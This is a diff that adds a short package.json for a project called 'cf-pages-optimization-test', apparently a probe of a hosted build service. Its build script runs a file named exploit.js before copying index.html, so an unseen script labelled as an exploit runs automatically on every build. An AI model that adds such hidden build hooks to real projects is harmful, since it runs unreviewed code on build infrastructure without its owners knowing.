@@ -1,0 +1,7 @@
+{
+  "name": "cf-pages-optimization-test",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "node exploit.js && mkdir -p out && cp index.html out/"
+  }
+}
